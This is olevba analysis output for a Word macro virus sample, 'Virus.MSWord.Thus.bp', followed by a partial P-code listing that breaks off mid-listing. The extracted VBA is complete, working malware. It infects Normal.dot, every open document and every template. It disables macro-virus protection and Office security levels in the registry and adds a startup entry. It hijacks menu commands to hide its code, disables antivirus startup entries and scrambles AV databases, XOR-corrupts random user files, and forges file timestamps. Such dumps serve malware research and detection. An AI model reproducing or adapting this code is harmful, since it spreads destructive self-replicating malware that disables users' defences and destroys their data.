olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Thus.bp
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Thus.bp - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Thus_001'
'NIST_32abcp2CETp'
Private Type FTM
     dwLowDateTime As Long
     dwHighDateTime As Long
End Type
Private Type STM
     wYear As Integer
     wMonth As Integer
     wDayOfWeek As Integer
     wDay As Integer
     wHour As Integer
     wMinute As Integer
     wSecond As Integer
     wMilliseconds As Integer
End Type
Private Declare Function CF& Lib "kernel32" Alias "CopyFileA" (ByVal _
    lpExistingFileName As String, ByVal lpNewFileName As String, ByVal _
    bFailIfExists As Long)
Private Declare Function CrF& Lib "kernel32" Alias "CreateFileA" (ByVal _
    lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, _
    lpSecurityAttributes As Any, ByVal dwCreationDisposition As _
    Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long)
Private Declare Function GFT& Lib "kernel32" Alias "GetFileTime" (ByVal hFile As Long, _
    lpCreationTime As FTM, lpLastAccessTime As FTM, lpLastWriteTime As _
    FTM)
Private Declare Function SFT& Lib "kernel32" Alias "SetFileTime" (ByVal hFile As Long, _
    lpCreationTime As FTM, lpLastAccessTime As FTM, lpLastWriteTime As _
    FTM)
Private Declare Function FTTST& Lib "kernel32" Alias "FileTimeToSystemTime" (lpFileTime As FTM, _
    lpSystemTime As STM)
Private Declare Function STTFT& Lib "kernel32" Alias "SystemTimeToFileTime" (lpSystemTime As _
    STM, lpFileTime As FTM)
Private Declare Function CHl& Lib "kernel32" Alias "CloseHandle" (ByVal hObject As Long)
Private Declare Function FWBC Lib "user32" _
    Alias "FindWindowA" _
    (ByVal lpClassName As String, ByVal lpWindowName As Long) _
    As Long
Private Declare Function LWU Lib "user32" Alias "LockWindowUpdate" _
    (ByVal hwndLock As Long) As Long
Private Sub Document_Open()
Dim k As Integer, Sd As Boolean, Nt As Boolean
    On Error Resume Next
    Application.ShowVisualBasicEditor = Chr(6048 / 21 / 6)
With Application
2   SUt 0, 1
    .EnableCancelKey = 0
    .DisplayAlerts = 0
If Application.ShowVisualBasicEditor Then GoTo 2
    .Options.VirusProtection = Chr(3696 / 7 / 11)
    .Options.ConfirmConversions = Chr(8976 / 11 / 17)
    .Options.SaveNormalPrompt = Chr(1872 / 3 / 13)
    .Options.SavePropertiesPrompt = Chr(9072 / 9 / 21)
    .Options.DefaultOpenFormat = 1
    .DefaultSaveFormat = ""
    .DisplayStatusBar = Chr(48)
End With
         WordBasic.DisableAutoMacros 0
    If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1), 17) <> "'NIST_32abcp2CETp" Then
     NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
    .CodeModule.CountOfLines
    Nt = -1
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
    .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
    .Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
  If Application.Documents.Count > 0 Then
    For k = 1 To Application.Documents.Count
    If Left(Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1), 17) <> "'NIST_32abcp2CETp" Then
    Sd = Application.Documents.Item(k).Saved
    Application.Documents.Item(k).ReadOnlyRecommended = Chr(48)
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
    .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    End If: Randomize
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
    .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
    .VBComponents.Item(1).CodeModule.CountOfLines)
    If Application.Documents.Item(k).SaveFormat > 1 Then
    Application.Documents.Item(k).SaveAs FileFormat:=0, ReadOnlyRecommended:=0
    Else: If (Sd) And (Dir(Application.Documents.Item(k).FullName, 7) <> "") Then Application.Documents.Item(k).Save
    End If
    End If
    Next k
  End If
  If Application.Templates.Count > 0 Then
    For k = 1 To Application.Templates.Count
    If Left(Application.Templates.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1), 17) <> "'NIST_32abcp2CETp" Then
    Sd = Application.Templates.Item(k).Saved
    Application.Templates.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.DeleteLines 1, Application.Templates.Item(k) _
    .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    End If
    If Application.Templates.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    Application.Templates.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
    .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
    .VBComponents.Item(1).CodeModule.CountOfLines)
    If (Sd) And (Dir(Application.Templates.Item(k).FullName, 7) <> "") Then Application.Templates.Item(k).Save
    End If
    Next k
  End If
    If Nt Then Exit Sub
DPIO 1
If Application.Documents.Count > 0 Then
Sd = ActiveDocument.Saved
If (Sd = False) And (ActiveDocument.ReadOnly = False) Then
       If Dir(ActiveDocument.FullName, 7) = "" Then
       ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=0, ReadOnlyRecommended:=0
       Else: ActiveDocument.Save
       End If
       Sd = ActiveDocument.Saved
       ActiveDocument.Saved = False
End If
If (Sd) And (ActiveDocument.SaveFormat < 2) Then RCy ActiveDocument.FullName, "DOC"
End If
SMHk "File", 23, "FileOpen"
SMHk "File", 3, "FileSave"
SMHk "Tools", 522, "ToolsOptions"
SMHk "Tools", 751, "FileTemplates"
SMHk "Tools", 797, "xxx"
SMHk "Macro", 1695, "ViewVBCode"
SMHk "Macro", 186, "ToolsMacro"
    SUt -1, 1
    Application.EnableCancelKey = 1
    Application.DisplayAlerts = -1
End Sub
Private Sub Document_Close()
Dim Res As String, X As String
On Error Resume Next
    SUt 0, 1
    Application.EnableCancelKey = 0
    Application.DisplayAlerts = Chr(48)
    Document_Open
    ASD
    Res = RnDr(Chr(Int((Len(GDs()) * Rnd) + 1) + 66) & Chr(58) & Chr(92))
If Res <> "" Then X = RFe(Res, "*.*")
If Len(X) <> 0 Then
    If UCase(Mid(X, Len(X) - 2, 2)) <> "DO" Then
        Res = Res & X
    Else
        Res = ""
    End If
Else
    Res = ""
End If
If Res <> "" Then DFe Res
    SUt -1, 1
    Application.EnableCancelKey = 1
    Application.DisplayAlerts = -1
End Sub
Private Sub Document_New()
    SUt 0, 1
    Application.EnableCancelKey = 0
    Application.DisplayAlerts = Chr(48)
    Document_Open
    AWd
    SUt -1, 1
    Application.EnableCancelKey = 1
    Application.DisplayAlerts = -1
End Sub
Private Sub AutoExec()
    Document_Open
End Sub
Private Sub AutoExit()
    Document_Open
End Sub
Private Sub FileOpen()
On Error Resume Next
With Dialogs(80)
    .Display
If .Name <> "" Then
     SetAttr .Name, 0
    .ReadOnly = Chr(48)
    .ConfirmConversions = 0
    .Execute
End If
End With
End Sub
Private Sub FileSave()
Application.ActiveDocument.Save
    Document_Open
End Sub
Private Sub Auto_Save()
    Document_Open
End Sub
Private Sub ToolsMacro()
Document_Open
MsgBox "File VBADLG.DLL not found", 16
End Sub
Private Sub ViewVBCode()
Document_Open
MsgBox "File VBADLG.DLL not found", 16
End Sub
Private Sub FileTemplates()
DPIO 1
Document_Open
MsgBox "Global template not loaded", 16
End Sub
Private Sub ToolsOptions()
On Error Resume Next
    Application.Options.VirusProtection = Chr(49)
    Dialogs(974).Show
    Application.Options.VirusProtection = Chr(48)
End Sub
Private Sub DPIO(SaveF As Boolean)
Dim FNum As Integer
Const Param = "dword:0000000"
Const Path = "\Software\Microsoft\Office\"
Dim Ver(1 To 2) As String
Ver(1) = "8.0\"
Ver(2) = "9.0\"
Const NewUse = "New User Settings\"
Const Def = "\.Default"
Const Sec = "Security"
Const Lev = "Level"
Const temp = "c:\~WRL8369.tmp"
Dim Keys(1 To 3) As String
Keys(1) = "HKEY_LOCAL_MACHINE"
Keys(2) = "HKEY_CURRENT_USER"
Keys(3) = "HKEY_USERS"
Dim Dis(1 To 3) As String
Dis(1) = "EnableMacroVirusProtection"
Dis(2) = "Options6"
Dis(3) = "MacroVirusProtection"
Dim AddId(1 To 6) As String
AddId(1) = "Word\Options"
AddId(2) = "Excel\Microsoft Excel"
AddId(3) = "PowerPoint\Options"
AddId(4) = "Word\7.0\Options"
AddId(5) = "Excel\7.0\Microsoft Excel"
AddId(6) = "PowerPoint\7.0\Options"
Dim i As Integer
Dim k As Integer
Dim X As Integer
Dim Use As String
On Error Resume Next
With System
If SaveF Then
Use = .PrivateProfileString("", Keys(2) & Left(Path, 20) & "Windows\CurrentVersion\" & Chr(82) & Chr(117) & Chr(110), "LoadPowerConfig")
If CBool(Len(Use) > 15) Then If CBool(Len(Dir(Right(Use, Len(Use) - 15), 7)) <> 0) Then If CBool(FileLen(Right(Use, Len(Use) - 15)) = 212 * 7) Then SaveF = 0
End If
If SaveF Then
    FNum = FreeFile
  Open temp For Output As #FNum
  Print #FNum, "REGEDIT4"
  Print #FNum, ""
End If
Use = .PrivateProfileString("", Keys(1) & "\System\CurrentControlSet\control", "Current User")
If (Use <> ".Default") Or (SaveF) Then X = 3 Else X = 2
For k = 1 To X
For i = 1 To 3
Select Case k
Case 1
.PrivateProfileString("", Keys(k) & Path & Ver(1) & NewUse & AddId(i), Dis(i)) = Chr(48)
.PrivateProfileString("", Keys(k) & "\Software\Microsoft\" & NewUse & AddId(i + 3), Dis(i)) = Chr(48)
If SaveF Then
 Print #FNum, "[" & Keys(k) & Path & Ver(1) & NewUse & AddId(i) & "]"
 Print #FNum, Chr(34) & Dis(i) & Chr(34) & "=" & Chr(34) & Chr(48) & Chr(34)
End If
Case 2
.PrivateProfileString("", Keys(k) & Path & Ver(1) & AddId(i), Dis(i)) = Chr(48)
.PrivateProfileString("", Keys(k) & "\Software\Microsoft\" & AddId(i + 3), Dis(i)) = Chr(48)
If SaveF Then
 Print #FNum, "[" & Keys(k) & Path & Ver(1) & AddId(i) & "]"
 Print #FNum, Chr(34) & Dis(i) & Chr(34) & "=" & Chr(34) & Chr(48) & Chr(34)
 Print #FNum, "[" & Keys(k) & Path & Ver(2) & Choose(i, Left(AddId(i), 5), Left(AddId(i), 6), Left(AddId(i), 11)) & Sec & "]"
 Print #FNum, Chr(34) & Lev & Chr(34) & "=" & Param & Chr(49)
End If
Case 3
.PrivateProfileString("", Keys(k) & Def & Path & Ver(1) & AddId(i), Dis(i)) = Chr(48)
.PrivateProfileString("", Keys(k) & Def & "\Software\Microsoft\" & AddId(i + 3), Dis(i)) = Chr(48)
If SaveF Then
 Print #FNum, "[" & Keys(k) & Def & Path & Ver(1) & AddId(i) & "]"
 Print #FNum, Chr(34) & Dis(i) & Chr(34) & "=" & Chr(34) & Chr(48) & Chr(34)
 Print #FNum, "[" & Keys(k) & Def & Path & Ver(2) & Choose(i, Left(AddId(i), 5), Left(AddId(i), 6), Left(AddId(i), 11)) & Sec & "]"
 Print #FNum, Chr(34) & Lev & Chr(34) & "=" & Param & Chr(49)
End If
End Select
Next i
Next k
If SaveF Then
    Close #FNum
Use = RCy(temp, "DLL")
    Kill temp
If Len(Use) <> 0 Then
.PrivateProfileString("", Keys(2) & Left(Path, 20) & "Windows\CurrentVersion\" & Chr(82) & Chr(117) & Chr(110), "LoadPowerConfig") = "Regedit.exe /s " & Chr(34) & Use & Chr(34)
If X = 3 Then .PrivateProfileString("", Keys(1) & Left(Path, 20) & "Windows\CurrentVersion\" & Chr(82) & Chr(117) & Chr(110), "SystemControl") = "Regedit.exe /s " & Chr(34) & Use & Chr(34)
End If
End If
End With
End Sub
Private Function GDs() As String
Const Rt = ":\"
Dim FileNum As Integer
Dim St As String
Dim i As Byte
On Error Resume Next
    FileNum = FreeFile
    For i = 1 To 24
    St = Chr(66 + i) & Rt & Chr(96)
    Open St For Binary As #FileNum
    Close #FileNum
    Kill St
    If Err = 0 Then GDs = GDs & Chr(66 + i) Else Err.Clear
    Next i
End Function
Private Sub SUt(X As Boolean, AppClass As Byte)
Dim Cls(1 To 4) As String
Cls(1) = "OpusApp"
Cls(2) = "XLMAIN"
Cls(3) = "PP97FrameClass"
Cls(4) = "OMain"
    Dim hwnd As Long
    Dim Ret As Long
On Error Resume Next
    Select Case X
    Case 0
        hwnd = FWBC(Cls(AppClass), 0&)
        Ret = LWU(hwnd)
    Case 1
        Ret = LWU(0&)
    End Select
End Sub
Private Function RCy(Sours As String, Ext As String) As String
Dim Fls As String, DirR As String
Dim k As Long, Er As Integer, A As Integer
On Error GoTo YYY
Do
Fls = GDs
DirR = RnDr(Mid(Fls, Int((Len(Fls) * Rnd) + 1), 1) & Chr(58) & Chr(92))
Fls = RFe(DirR, "*.*")
Er = Er + 1
If Er > 10 Then Exit Function
Loop Until Fls <> ""
k = InStr(1, Fls, ".", 1)
If k <> 0 Then
Fls = Left(Fls, Len(Fls) - (Len(Fls) - k) - 1)
End If
Fls = Fls & "." & Ext
DirR = DirR & Fls
If Dir(DirR, 7) <> "" Then
    A = 1
    Er = GetAttr(DirR)
    SetAttr DirR, 0
End If
RCy = DirR
k = CF&(Sours, DirR, 0)
RTm DirR, 0
If A Then SetAttr DirR, Er
YYY:
End Function
Private Sub DFe(Path As String)
Dim Attr As Integer
Dim Siz As Long, Cmp As Long
Dim FileNum As Integer
Dim i As Integer
Dim Ofs As Byte
On Error GoTo Ends
    Siz = FileLen(Path)
If Siz < 11 Then Exit Sub
    Attr = GetAttr(Path)
    SetAttr Path, 0
    RTm Path, 2
    FileNum = FreeFile
Open Path For Binary As #FileNum
    If Siz < 32763 Then Ofs = 9 Else Ofs = 3
    Get #FileNum, Siz - Ofs, Cmp
If Siz = Cmp Then Exit Sub
    Cmp = Siz
If Siz > 32763 Then Siz = 32763
ReDim Buf(1 To Siz) As Byte
        Rnd (-100)
    Get #FileNum, 10, Buf
    For i = 1 To Siz
    Buf(i) = Buf(i) Xor Int((255 * Rnd) + 0)
    Next i
    Put #FileNum, 10, Buf
        Cmp = Cmp + Ofs
    Put #FileNum, Cmp - Ofs, Cmp
    Close #FileNum
    RTm Path, 1
    SetAttr Path, Attr
Ends:
End Sub
Private Sub ASD()
Const Path1 = "\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Const Path2 = "\System\CurrentControlSet\Services\VxD\SpIDer"
Const Key = "HKEY_LOCAL_MACHINE"
Const RN = "RUNDLL.EXE"
Dim Ext(1 To 4) As String
Ext(1) = "*.EXE"
Ext(2) = "*.DLL"
Dim Name As String
Dim i As Integer, k As Integer
Dim ProgPath As String
On Error Resume Next
With System
For i = 1 To 4
Select Case i
    Case 1
Name = Chr(83) & Chr(112) & Chr(73) & Chr(68) & Chr(101) & Chr(114)
    Case 2
Name = Chr(65) & Chr(86) & Chr(80) & Chr(67) & Chr(67)
    Case 3
Name = Chr(65) & Chr(86) & Chr(80) & Chr(73)
    Case 4
Name = Chr(65) & Chr(86) & Chr(80) & Chr(67) & Chr(67) & " Service"
End Select
If i = 4 Then
    ProgPath = .PrivateProfileString("", Key & Path1 & "Services", Name)
Else
    ProgPath = .PrivateProfileString("", Key & Path1, Name)
End If
If (ProgPath <> "") And (ProgPath <> RN) Then
If i = 4 Then
.PrivateProfileString("", Key & Path1 & "Services", Name) = RN
Else
.PrivateProfileString("", Key & Path1, Name) = RN
End If
If i = 1 Then .PrivateProfileString("", Key & Path2, "StaticVxD") = "*IOS"
ProgPath = PTD(ProgPath)
For k = 1 To 3
If k = 1 Then Ext(3) = "*.VDB" Else Ext(3) = "*.AVC"
Name = Dir(ProgPath & Ext(k), 7)
Do While Len(Name) <> 0
DFe ProgPath & Name
Name = Dir
Loop
Next k
End If
Next i
End With
End Sub
Private Sub RTm(FName As String, Md As Byte)
Dim hF As Long, i As Byte, Yr As Integer, Mn As Integer, CurYr As Integer
Dim St As STM
Dim DT(1 To 3) As FTM
On Error Resume Next
hF = CrF(FName, &HC0000000, 3&, ByVal 0&, 3&, &H10000080, 0&)
Call GFT(hF, DT(1), DT(2), DT(3))
Select Case Md
    Case 0
Yr = (Year(Now) - 8) + Int((8 * Rnd) + 1)
Mn = St.wMonth = Int((12 * Rnd) + 1)
CurYr = Int((Month(Now) * Rnd) + 1)
For i = 1 To 3
Call FTTST(DT(i), St)
St.wYear = Yr
If St.wYear = Year(Now) Then St.wMonth = CurYr _
Else St.wMonth = Mn
Call STTFT(St, DT(i))
Next i
  Case 1
For i = 1 To 3
DT(i).dwLowDateTime = DT(i).dwLowDateTime + Int((1000 * Rnd) + 10000)
Next i
    Case 2
Call CHl(hF)
Exit Sub
End Select
Call SFT(hF, DT(1), DT(2), DT(3))
Call CHl(hF)
End Sub
Private Function PTD(Path As String) As String
Dim tmp As String
Dim i As Long, k As Long
On Error GoTo Sti
If Path = "" Then GoTo Sti
k = Len(Path)
For i = k To 1 Step -1
    If Mid(Path, i, 1) = "\" Then Exit For
Next i
PTD = Left(Path, i)
Exit Function
Sti:
    PTD = ""
End Function
Private Sub AWd()
Const Key = "HKEY_CLASSES_ROOT"
Dim S As String, i As Byte
Dim Ext(1 To 7) As String
Ext(1) = "wri": Ext(2) = "diz": Ext(3) = "nfo": Ext(4) = "cnt": Ext(5) = "log": Ext(6) = "me": Ext(7) = "1st"
On Error Resume Next
With System
  S = .PrivateProfileString("", Key & "\.doc", "")
 For i = 1 To 7
  .PrivateProfileString("", Key & "\." & Ext(i), "") = S
 Next i
  S = .PrivateProfileString("", Key & "\.wbk", "")
  .PrivateProfileString("", Key & "\.bak", "") = S
End With
End Sub
Private Sub SMHk(CBName As String, CID As Long, ProcName As String)
Dim A As CommandBar, B As CommandBarControl
On Error Resume Next
Set A = CommandBars(CBName)
Set B = A.FindControl(Type:=msoControlButton, ID:=CID)
    If Not B Is Nothing Then If B.OnAction <> ProcName Then B.OnAction = ProcName
For Each A In CommandBars
    Set B = A.FindControl(Type:=msoControlButton, ID:=CID)
    If Not B Is Nothing Then If B.OnAction <> ProcName Then B.OnAction = ProcName
Next A
End Sub
Private Function RDr(ByVal Path As String) As String
Const Maska = "*.*"
Dim Buf As New Collection
Dim FindName As String
If Right(Path, 1) <> "\" Then Path = Path & "\"
On Error GoTo Errs
  FindName = Dir(Path, 23)
  Do While Len(FindName) <> 0
    If (GetAttr(Path & FindName) And vbDirectory) = vbDirectory Then
        If Left(FindName, 1) <> "." Then Buf.Add FindName
    End If
         FindName = Dir
  Loop
        RDr = UCase(Path & Buf(Int((Buf.Count * Rnd) + 1)))
Errs:
        If Buf.Count = 0 Then RDr = ""
End Function
Private Function RnDr(ByVal Path As String) As String
Dim tmp As String
Dim i As Integer
Dim GetRandom As Integer
Dim RandStep As Integer
   GetRandom = Int((1001 * Rnd) + 1)
     RandStep = 0
   For i = 1 To 10
        tmp = RDr(Path)
        If tmp <> "" Then Path = tmp
        If (tmp = "") And (i = 1) Then
              RnDr = ""
              Exit Function
        End If
        If (tmp = "") And (i <> 1) Then
              RnDr = Path & "\"
              Exit Function
        End If
    Select Case RandStep
        Case 0 To 200
            RandStep = RandStep + 200
        Case 400 To 600
            RandStep = RandStep + 100
        Case 700 To 900
            RandStep = RandStep + 50
    End Select
        If RandStep >= GetRandom Then
             RnDr = Path & "\"
             Exit Function
        End If
     Next i
End Function
Private Function RFe(ByVal Path As String, Maska As String) As String
Dim Buf As New Collection
Dim FindName As String
Path = Path & Maska
On Error GoTo Errs
  FindName = Dir(Path, 7)
  Do While Len(FindName) <> 0
        Buf.Add FindName
         FindName = Dir
  Loop
        RFe = UCase(Buf(Int(Buf.Count * Rnd) + 1))
Errs:
        If Buf.Count = 0 Then RFe = ""
End Function
Private Sub xxx()
End Sub











-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Thus.bp
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 35553 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0009 "Thus_001'"
' Line #2:
' 	QuoteRem 0x0000 0x0011 "NIST_32abcp2CETp'"
' Line #3:
' 	Type (Private) FTM
' Line #4:
' 	DimImplicit 
' 	VarDefn dwLowDateTime (As Long)
' Line #5:
' 	DimImplicit 
' 	VarDefn dwHighDateTime (As Long)
' Line #6:
' 	EndType 
' Line #7:
' 	Type (Private) STM
' Line #8:
' 	DimImplicit 
' 	VarDefn wYear (As Integer)
' Line #9:
' 	DimImplicit 
' 	VarDefn wMonth (As Integer)
' Line #10:
' 	DimImplicit 
' 	VarDefn wDayOfWeek (As Integer)
' Line #11:
' 	DimImplicit 
' 	VarDefn wDay (As Integer)
' Line #12:
' 	DimImplicit 
' 	VarDefn wHour (As Integer)
' Line #13:
' 	DimImplicit 
' 	VarDefn wMinute (As Integer)
' Line #14:
' 	DimImplicit 
' 	VarDefn wSecond (As Integer)
' Line #15:
' 	DimImplicit 
' 	VarDefn wMilliseconds (As Integer)
' Line #16:
' 	EndType 
' Line #17:
' 	LineCont 0x0008 0A 00 04 00 14 00 04 00
' 	FuncDefn (Private Declare Function CF Lib "kernel32" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long))
' Line #18:
' 	LineCont 0x000C 0A 00 04 00 18 00 04 00 1F 00 04 00
' 	FuncDefn (Private Declare Function CrF Lib "kernel32" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, lpSecurityAttributes As , ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long))
' Line #19:
' 	LineCont 0x0008 0E 00 04 00 18 00 04 00
' 	FuncDefn (Private Declare Function GFT Lib "kernel32" (ByVal hFile As Long, lpCreationTime As , lpLastAccessTime As , lpLastWriteTime As ))
' Line #20:
' 	LineCont 0x0008 0E 00 04 00 18 00 04 00
' 	FuncDefn (Private Declare Function SFT Lib "kernel32" (ByVal hFile As Long, lpCreationTime As , lpLastAccessTime As , lpLastWriteTime As ))
' Line #21:
' 	LineCont 0x0004 0D 00 04 00
' 	FuncDefn (Private Declare Function FTTST Lib "kernel32" (lpFileTime As , lpSystemTime As ))
' Line #22:
' 	LineCont 0x0004 0B 00 04 00
' 	FuncDefn (Private Declare Function STTFT Lib "kernel32" (lpSystemTime As , lpFileTime As ))
' Line #23:
' 	FuncDefn (Private Declare Function CHl Lib "kernel32" (ByVal hObject As Long))
' Line #24:
' 	LineCont 0x000C 06 00 04 00 08 00 04 00 13 00 04 00
' 	FuncDefn (Private Declare Function FWBC Lib "user32" (ByVal lpClassName As String, ByVal lpWindowName As Long) As Long)
' Line #25:
' 	LineCont 0x0004 08 00 04 00
' 	FuncDefn (Private Declare Function LWU Lib "user32" (ByVal hwndLock As Long) As Long)
' Line #26:
' 	FuncDefn (Private Sub Document_Open())
' Line #27:
' 	Dim 
' 	VarDefn k (As Integer)
' 	VarDefn Sd (As Boolean)
' 	VarDefn Nt (As Boolean)
' Line #28:
' 	OnError (Resume Next) 
' Line #29:
' 	LitDI2 0x17A0 
' 	LitDI2 0x0015 
' 	Div 
' 	LitDI2 0x0006 
' 	Div 
' 	ArgsLd Chr 0x0001 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #30:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #31:
' 	LineNum 2 
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	ArgsCall SUt 0x0002 
' Line #32:
' 	LitDI2 0x0000 
' 	MemStWith EnableCancelKey 
' Line #33:
' 	LitDI2 0x0000 
' 	MemStWith DisplayAlerts 
' Line #34:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	If 
' 	BoSImplicit 
' 	GoTo 2 
' 	EndIf 
' Line #35:
' 	LitDI2 0x0E70 
' 	LitDI2 0x0007 
' 	Div 
' 	LitDI2 0x000B 
' 	Div 
' 	ArgsLd Chr 0x0001 
' 	MemLdWith Options 
' 	MemSt VirusProtection 
' Line #36:
' 	LitDI2 0x2310 
' 	LitDI2 0x000B 
' 	Div 
' 	LitDI2 0x0011 
' 	Div 
' 	ArgsLd Chr 0x0001 
' 	MemLdWith Options 
' 	MemSt ConfirmConversions 
' Line #37:
' 	LitDI2 0x0750 
' 	LitDI2 0x0003 
' 	Div 
' 	LitDI2 0x000D 
' 	Div 
' 	ArgsLd Chr 0x0001 
' 	MemLdWith Options 
' 	MemSt SaveNormalPrompt 
' Line #38:
' 	LitDI2 0x2370 
' 	LitDI2 0x0009 
' 	Div 
' 	LitDI2 0x0015 
' 	Div 
' 	ArgsLd Chr 0x0001 
' 	MemLdWith Options 
' 	MemSt SavePropertiesPrompt 
' Line #39:
' 	LitDI2 0x0001 
' 	MemLdWith Options 
' 	MemSt DefaultOpenFormat 
' Line #40:
' 	LitStr 0x0000 ""
' 	MemStWith DefaultSaveFormat 
' Line #41:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	MemStWith DisplayStatusBar 
' Line #42:
' 	EndWith 
' Line #43:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #44:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0011 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0011 "'NIST_32abcp2CETp"
' 	Ne 
' 	IfBlock 
' Line #45:
' 	LineCont 0x0008 0C 00 04 00 1A 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #46:
' 	LitDI2 0x0001 
' 	UMi 
' 	St Nt 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #49:
' 	LineCont 0x000C 0C 00 04 00 1A 00 04 00 26 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #52:
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #53:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	For 
' Line #54:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0011 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0011 "'NIST_32abcp2CETp"
' 	Ne 
' 	IfBlock 
' Line #55:
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Saved 
' 	St Sd 
' Line #56:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt ReadOnlyRecommended 
' Line #57:
' 	LineCont 0x0008 11 00 04 00 1F 00 04 00
